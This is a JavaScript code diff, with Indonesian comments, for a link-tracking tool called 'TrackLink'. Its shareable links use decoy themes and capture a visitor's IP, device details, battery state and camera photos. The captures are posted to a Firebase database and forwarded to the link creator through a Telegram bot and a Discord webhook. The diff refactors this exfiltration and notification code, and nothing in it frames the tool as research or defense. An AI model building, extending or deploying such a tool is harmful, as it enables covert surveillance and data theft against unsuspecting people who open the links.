@@ -33,12 +33,17 @@ export async function writeToFirebase(fbUrl, linkId, capture) {
   if (!fbUrl) return;
   const url = `${fbUrl.replace(/\/$/, '')}/captures/${linkId}.json`;
   try {
-    await fetch(url, {
+    const response = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(capture),
     });
-  } catch { /* silent — tidak blokir tracking */ }
+    if (!response.ok) {
+        console.error('Firebase POST gagal:', response.statusText);
+    }
+  } catch (error) {
+    console.error('Gagal tulis ke Firebase:', error);
+  }
 }
 
 // Baca semua captures dari Firebase untuk satu link
@@ -101,13 +106,11 @@ export function createLink({ name, decoyTheme, trackIp, trackDevice, trackBatter
     id,
     decoyTheme: theme,
     options: { trackIp, trackDevice, trackBattery, trackCamera },
-    // Encode semua credentials agar visitor bisa kirim notif + tulis ke Firebase
+    // Sertakan Firebase URL saja (aman jika Rules Firebase dikunci per link)
     notif: {
-      tg: (settings.telegramToken && settings.telegramChatId)
-        ? { token: settings.telegramToken, chatId: settings.telegramChatId }
-        : null,
-      dc: settings.discordWebhook || null,
-      fb: settings.firebaseUrl || null,  // ← Firebase URL untuk simpan data visitor
+      tg: null,
+      dc: null,
+      fb: settings.firebaseUrl || null,
     },
   };
 
@@ -146,10 +149,19 @@ export async function addCapture(linkId, capture, notifOverride) {
   // ← KUNCI: tulis ke Firebase agar data visitor masuk ke dashboard creator
   const fbUrl = settings.fb || settings.firebaseUrl;
   if (fbUrl) {
-    writeToFirebase(fbUrl, linkId, captureWithMeta); // async, tidak ditunggu
+    await writeToFirebase(fbUrl, linkId, captureWithMeta);
   }
 
-  sendNotification(settings, linkName, linkId, captureWithMeta);
+  // Kirim notifikasi hanya jika settings tersedia di dashboard
+  // (tidak menggunakan notifOverride dari config URL)
+  if (settings.telegramToken && settings.telegramChatId) {
+    const tg = { token: settings.telegramToken, chatId: settings.telegramChatId };
+    await sendNotificationToTelegram(tg, linkName, linkId, captureWithMeta);
+  }
+  if (settings.discordWebhook) {
+    await sendNotificationToDiscord(settings.discordWebhook, linkName, linkId, captureWithMeta);
+  }
+
   return idx !== -1 ? links[idx] : null;
 }
 
@@ -157,47 +169,52 @@ export function deleteLink(id) { saveLinks(getLinks().filter(l => l.id !== id));
 export function clearLinks()   { saveLinks([]); }
 
 /* ── Notification ─────────────────────────────────────────── */
+export async function sendNotificationToTelegram(tg, linkName, linkId, cap) {
+  if (!tg?.token || !tg?.chatId) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${tg.token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: tg.chatId,
+        text: buildTelegramMsg(linkName, cap),
+        parse_mode: 'HTML',
+        disable_web_page_preview: true,
+      }),
+    });
+    if (cap.photo) {
+      const blob = await (await fetch(cap.photo)).blob();
+      const fd   = new FormData();
+      fd.append('chat_id', tg.chatId);
+      fd.append('photo',   blob, 'capture.jpg');
+      fd.append('caption', `📷 Foto — ${linkName}`);
+      await fetch(`https://api.telegram.org/bot${tg.token}/sendPhoto`, { method: 'POST', body: fd });
+    }
+  } catch { /* silent */ }
+}
+
+export async function sendNotificationToDiscord(dc, linkName, linkId, cap) {
+  if (!dc) return;
+  try {
+    await fetch(dc, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: '🎯 TrackLink',
+        embeds: [{ title: `🔔 ${linkName}`, color: 0x22c55e, fields: buildDiscordFields(cap), timestamp: new Date().toISOString() }],
+      }),
+    });
+  } catch { /* silent */ }
+}
+
 export async function sendNotification(settings, linkName, linkId, cap) {
   const tg = settings.tg || (settings.telegramToken && settings.telegramChatId
     ? { token: settings.telegramToken, chatId: settings.telegramChatId }
     : null);
   const dc = settings.dc || settings.discordWebhook || null;
 
-  if (tg?.token && tg?.chatId) {
-    try {
-      await fetch(`https://api.telegram.org/bot${tg.token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: tg.chatId,
-          text: buildTelegramMsg(linkName, cap),
-          parse_mode: 'HTML',
-          disable_web_page_preview: true,
-        }),
-      });
-      if (cap.photo) {
-        const blob = await (await fetch(cap.photo)).blob();
-        const fd   = new FormData();
-        fd.append('chat_id', tg.chatId);
-        fd.append('photo',   blob, 'capture.jpg');
-        fd.append('caption', `📷 Foto — ${linkName}`);
-        await fetch(`https://api.telegram.org/bot${tg.token}/sendPhoto`, { method: 'POST', body: fd });
-      }
-    } catch { /* silent */ }
-  }
-
-  if (dc) {
-    try {
-      await fetch(dc, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          username: '🎯 TrackLink',
-          embeds: [{ title: `🔔 ${linkName}`, color: 0x22c55e, fields: buildDiscordFields(cap), timestamp: new Date().toISOString() }],
-        }),
-      });
-    } catch { /* silent */ }
-  }
+  if (tg) await sendNotificationToTelegram(tg, linkName, linkId, cap);
+  if (dc) await sendNotificationToDiscord(dc, linkName, linkId, cap);
 }
 
 function buildTelegramMsg(linkName, cap) {
